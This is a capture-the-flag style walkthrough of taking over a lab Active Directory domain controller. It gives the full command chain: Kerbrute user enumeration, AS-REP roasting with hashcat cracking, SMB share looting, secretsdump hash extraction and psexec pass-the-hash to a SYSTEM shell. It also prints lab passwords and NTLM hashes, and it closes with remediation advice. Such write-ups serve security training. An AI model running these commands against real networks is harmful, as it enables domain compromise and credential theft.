**Date**: December 19, 2025  
**Target IP**: `10.49.179.130`  
**Domain**: `spookysec.local`  
**Domain NetBIOS**: `THM-AD`  
**Domain Controller**: `AttacktiveDirectory.spookysec.local`  
**OS**: Windows Server 2019 (Version 10.0.17763)

---

## **1. Reconnaissance & Service Enumeration**

An initial Nmap scan revealed a fully featured Active Directory Domain Controller:

```bash
nmap -p- -sV -sC 10.49.179.130
```

### Key Services Identified:
| Port   | Service           | Details |
|--------|-------------------|--------|
| 53     | DNS               | BIND (version exposed via TCP) |
| 80     | HTTP              | Microsoft IIS 10.0 |
| 88     | Kerberos          | Windows Kerberos service |
| 135/139/445 | SMB/RPC      | Active Directory, SMB shares, NetBIOS |
| 389/636 | LDAP/LDAPS       | Domain: `spookysec.local` |
| 464    | kpasswd           | Kerberos password change |
| 3389   | RDP               | Windows Terminal Services |
| 5985   | WinRM             | HTTPAPI 2.0 |
| 9389   | .NET Message Framing | AD Web Services |

### LDAP Enumeration Confirms Domain Structure:
```bash
nmap -p 389 --script ldap-rootdse 10.49.179.130
```
- **DNS Domain**: `DC=spookysec,DC=local`
- **DC Hostname**: `AttacktiveDirectory.spookysec.local`
- **Kerberos Realm**: `SPOOKYSEC.LOCAL`
- **NetBIOS Domain**: `THM-AD` (from RDP NLA banner)

>  **Insight**: The environment uses a DNS domain (`spookysec.local`) distinct from its NetBIOS name (`THM-AD`)—a common configuration in modern AD deployments.

---

## **2. User Enumeration via Kerbrute**

A custom user list was tested using `kerbrute` against the Kerberos service (port 88):

```bash
./kerbrute_linux_amd64 userenum --domain spookysec.local --dc 10.49.179.130 ./userlist.txt
```

### Valid Accounts Identified:
- `administrator`
- `svc-admin`
- `backup`
- `james`, `robin`, `darkstar`, `paradox`, `ori`, etc.

>  Total: **16 valid domain accounts** discovered.

---

## **3. Exploitation: AS-REP Roasting**

The `GetNPUsers.py` script was used to target accounts **without Kerberos pre-authentication**:

```bash
python /opt/impacket/examples/GetNPUsers.py -no-pass -usersfile shortlisted-users.txt spookysec.local/
```

### Result:
- The **`svc-admin`** account was vulnerable.
- TGT hash captured in `$krb5asrep$23$` format.

### Cracking with Hashcat:
```bash
hashcat -m 18200 hash.txt passwordlist.txt
```

**Plaintext Password Recovered**:  
```
management2005
```

>  **Note**: This demonstrates weak password policy and misconfigured account security settings.

---

## **4. Credential Reuse & Share Enumeration**

Using the `svc-admin:management2005` credentials, SMB shares were enumerated:

```bash
smbclient -L //10.49.179.130 -U svc-admin
```

### Exposed Shares:
- `ADMIN$`, `C$`, `NETLOGON`, `SYSVOL`
- **Custom share**: `backup`

### Accessing the `backup` Share:
```bash
smbclient //10.49.179.130/backup -U svc-admin
```

A file `backup_credentials.txt` was found and downloaded.

### Decoding the File:
The file contained a **Base64-encoded string**:
```
WW1GamEzVndRSE53YjI5cmVYTmxZeTVzYjJOaGJEcGlZV05yZFhBeU5URTNPRFl3
```

Decoded via [CyberChef](https://cyberchef.org/#recipe=From_Base64):
```
backup@spookysec.local:backup2517860
```

>  **Critical Finding**: Credentials for a second service account (`backup`) were stored in plaintext on an SMB share accessible to `svc-admin`.

---

## **5. Domain Hash Extraction**

Using the `backup:backup2517860` credentials, **domain hash dumping** was performed:

```bash
python /opt/impacket/examples/secretsdump.py -just-dc-ntlm -dc-ip 10.49.179.130 backup:backup2517860@10.49.179.130
```

### Key Hashes Obtained:
| Account        | RID  | NTLM Hash                              |
|----------------|------|----------------------------------------|
| **Administrator** | 500  | `0e0363213e37b94221497260b0bcb4fc`     |
| **krbtgt**        | 502  | `0e2eb8158c27bed09861033026be4c21`     |
| svc-admin      | 1114 | `fc0f1e5359e372aa1f69147375ba6809`     |
| backup         | 1118 | `19741bde08e135f4b40f1ca9aab45538`     |

>  **Full domain compromise achieved**: All user NTLM hashes extracted from `NTDS.dit`.

---

## **6. Privilege Escalation: Pass-the-Hash**

The Administrator NTLM hash was used to gain a **SYSTEM-level shell** via `psexec.py`:

```bash
python /opt/impacket/examples/psexec.py -hashes :0e0363213e37b94221497260b0bcb4fc spookysec.local/Administrator@10.49.179.130
```

### Result:
```cmd
C:\Windows\system32> whoami
nt authority\system
```

>  **Full control over the Domain Controller**.

---

## **7. Attack Path Summary**

1. **Recon**: Nmap identified AD services.
2. **Enumeration**: `kerbrute` discovered valid users.
3. **Exploitation**: AS-REP roasting compromised `svc-admin`.
4. **Lateral Movement**: `svc-admin` accessed `backup` share.
5. **Credential Exposure**: Base64-decoded backup credentials.
6. **Domain Dump**: `backup` account had DRSUAPI replication rights.
7. **Escalation**: Pass-the-Hash → SYSTEM shell.

---

## **8. Remediation Recommendations**

1. **Enforce Kerberos Pre-Authentication**  
   → Disable `UF_DONT_REQUIRE_PREAUTH` on all accounts.

2. **Secure Service Accounts**  
   → Do not store credentials in plaintext on network shares.

3. **Least Privilege for Service Accounts**  
   → `backup` should not have domain dump privileges (i.e., be a member of Domain Admins or equivalent).

4. **Enable SMB Signing**  
   → Prevents NTLM relay attacks (already enforced here, but verify universally).

5. **Monitor for AS-REP Roasting**  
   → Alert on TGT requests for accounts without pre-auth.

6. **Rotate krbtgt Password Twice**  
   → Invalidates Golden Ticket potential after compromise.

---

## **Appendix: Key Commands**

```bash
# User enum
./kerbrute_linux_amd64 userenum --domain spookysec.local --dc 10.49.179.130 userlist.txt

# AS-REP roast
python GetNPUsers.py -no-pass -usersfile users.txt spookysec.local/

# Crack
hashcat -m 18200 hash.txt passwordlist.txt

# SMB access
smbclient //10.49.179.130/backup -U svc-admin

# Decode creds
echo "WW1GamEzVndRSE53YjI5cmVYTmxZeTVzYjJOaGJEcGlZV05yZFhBeU5URTNPRFl3" | base64 -d

# Dump hashes
python secretsdump.py -just-dc-ntlm backup:backup2517860@10.49.179.130

# Get shell
python psexec.py -hashes :0e0363213e37b94221497260b0bcb4fc Administrator@10.49.179.130
```

---
